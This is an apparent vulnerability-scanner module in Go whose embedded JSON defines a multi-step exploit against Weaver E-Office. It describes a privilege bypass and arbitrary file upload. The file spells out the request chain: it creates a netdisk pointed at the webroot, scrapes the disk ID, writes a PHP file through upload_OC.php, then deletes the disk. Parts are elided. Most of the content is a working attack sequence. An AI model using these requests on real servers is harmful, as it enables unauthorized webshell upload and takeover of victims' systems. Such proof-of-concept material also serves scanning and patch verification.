...
func init() {
	expJson := `{
    "Name": "Weaver E-Office sample Bypass submit File Overwrite Bypass Vulnerability",
    "Description": "<p>E-office is a standard collaborative mobile office platform of Shanghai Pan Micro Network Technology Co., Ltd.</p><p>E-office has a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions.</p>",
    ...
    "ScanSteps": [
        ...
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/system/netdisk/new/submit.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "{{{setcookie}}}"
                ...
                "data_type": "text",
                "data": "DISK_NAME=eoffice&DISK_PATH=D:/eoffice/webroot/cab&DISK_TYPE=1&DEPT_ID=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
        ...
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/system/netdisk/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
            ...
            "SetVariable": [
                "disk|lastbody|regex|edit.php\\?DISK_ID=(.*?)\">"
            ]
        },
        {
            "Request": {
        ...
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/module/OC_NETDISK/upload_OC.php?DISK_ID={{{disk}}}&fichier=eoffice.php&ATTACHMENT=D:/eoffice/webroot/attachment/{{{filename}}}/1.jpg",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
        ...
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/system/netdisk/delete.php?DISK_ID={{{disk}}}",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
    ...
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office sample 权限绕过 submit 文件覆盖漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>e-office是上海泛微网络科技股份有限公司一款标准协同移动办公平台。</p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">e-office 存在权限绕过漏洞，攻击者可以绕过权限校验，上传</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">任意文件</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">获取服务器控制权限。</span><br></p>",
        ...
        "EN": {
            "Name": "Weaver E-Office sample Bypass submit File Overwrite Bypass Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">E-office is a standard collaborative mobile office platform of Shanghai Pan Micro Network Technology Co., Ltd.</span><br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">E-office has&nbsp;</span><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions.</span><br></span></p>",
